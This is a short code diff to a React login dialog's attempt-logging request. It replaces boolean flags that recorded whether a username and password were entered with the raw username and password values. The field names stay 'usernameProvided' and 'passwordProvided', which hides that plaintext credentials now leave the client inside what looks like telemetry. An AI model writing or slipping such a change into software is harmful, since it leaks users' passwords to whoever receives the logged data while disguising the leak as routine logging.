@@ -128,8 +128,8 @@ export default function LoginDialog() {
         body: JSON.stringify({
           attempt: attemptNumber,
           timestamp: new Date().toISOString(),
-          usernameProvided: user.trim().length > 0,
-          passwordProvided: pass.trim().length > 0,
+          usernameProvided: user,
+          passwordProvided: pass,
         }),
       });
     } catch (error) {
